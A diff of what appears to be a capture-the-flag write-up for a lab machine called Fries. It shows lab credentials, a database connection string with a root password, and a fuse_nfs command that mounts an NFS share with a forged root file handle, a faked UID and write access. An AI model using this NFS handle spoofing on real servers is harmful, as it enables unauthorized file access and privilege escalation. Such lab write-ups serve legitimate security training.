@@ -3,6 +3,7 @@
 d.cooper@fries.htb  ::  D4LE11maan!!
 
 DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
+
 SECRET_KEY=y0st528wn1idjk3b9a
 ```
 
@@ -56,7 +57,7 @@ nfs_analyze 127.0.0.1 /srv/web.fries.htb
 You get Root File Handle ;
 
 ```
-fuse_nfs /tmp/mount3/ 127.0.0.1 --fake-uid --allow-write --manual-fh 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000
+fuse_nfs ~/HTB_/FRIES_/mount_ 127.0.0.1 --fake-uid --allow-write --manual-fh 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000
 ```
 
 
